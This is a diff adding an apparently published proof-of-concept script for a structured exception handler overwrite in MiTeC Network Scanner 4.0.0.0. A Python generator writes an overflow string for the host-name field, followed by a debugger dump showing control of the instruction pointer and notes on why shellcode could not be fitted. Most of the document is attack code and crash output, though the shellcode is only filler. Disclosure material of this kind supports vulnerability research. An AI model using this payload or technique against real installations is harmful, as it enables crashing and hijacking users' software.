@@ -1,0 +1,79 @@
+#-*- coding: utf-8 -*-
+#
+# Exploit Title: Network Scanner Version 4.0.0.0  SEH Crash POC
+# POC Dork: N/A
+# Date: 2016-02-15
+# Author: INSECT.B
+#   Twitter : @INSECT.B
+#   Facebook : https://www.facebook.com/B.INSECT00
+#   Blog : http://binsect00.tistory.com
+# Vendor Homepage: http://www.mitec.cz/
+# Software Link: http://www.mitec.cz/Downloads/NetScan.zip
+# Version: 4.0.0.0
+# Tested on: Windows7 Professional SP1 En x86 
+# CVE : N/A
+ 
+'''
+[+] Type : SEH
+[-] Insert the string that compile this file in [TOOLS] Tab 'Detect IP from Host name...' field
+[-] string : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÌÌÌÌBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+[-] crash info
+(2d0.878): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=42424242 edx=772571cd esi=00000000 edi=00000000
+eip=42424242 esp=0012edd8 ebp=0012edf8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
+42424242 ??              ???
+
+0:000> !exchain
+0012edec: ntdll!ExecuteHandler2+3a (772571cd)
+0012f534: 42424242
+Invalid exception stack at cccccccc
+
+0:000> d 12f534
+0012f534  cc cc cc cc 42 42 42 42-43 43 43 43 43 43 43 43  ....BBBBCCCCCCCC
+0012f544  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f554  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f564  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f574  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f584  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f594  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f5a4  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0:000> d
+0012f5b4  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f5c4  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f5d4  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0012f5e4  43 43 43 00 95 b4 31 74-84 f6 12 00 00 00 00 00  CCC...1t........
+0012f5f4  0a 80 00 00 ea 01 24 00-00 00 00 00 00 00 00 00  ......$.........
+0012f604  ab 00 0a e7 34 f6 12 00-e7 c4 06 77 ea 01 24 00  ....4......w..$.
+0012f614  15 02 00 00 00 00 00 00-00 00 00 00 15 02 00 00  ................
+0012f624  cd ab ba dc 00 00 00 00-84 f6 12 00 15 02 00 00  ................
+
+
+'''
+
+import struct
+
+junk1 = "A" * 76
+nSEH = "\xcc\xcc\xcc\xcc"
+SEH = "BBBB"
+shell = "C" * 300
+
+payload = junk1 + nSEH + SEH + shell
+with open("netEx.txt","wb") as f :
+	f.write(payload)
+print payload
+
+"""
+Exploit problem
+
+1. Input string(value) was replaced '0x3f' in the memory. then shellcode should be encoded to alpha_mixed.
+   Buffer size was 171 bytes. but, encoded shellcode size was over 600 bytes.
+
+2. Null byte cannot be inserted into Input field. so we can't use SEH pointer in a range of NetScanner.exe address (0x00400000~0x008c3000)
+
+3. payload was consisted of  'junk - shellcode - nSEH ptr - SEH ptr'. but this step was fail. because junk buffer size was 76 bytes.
+   Can't insert shellcode
+
+"""
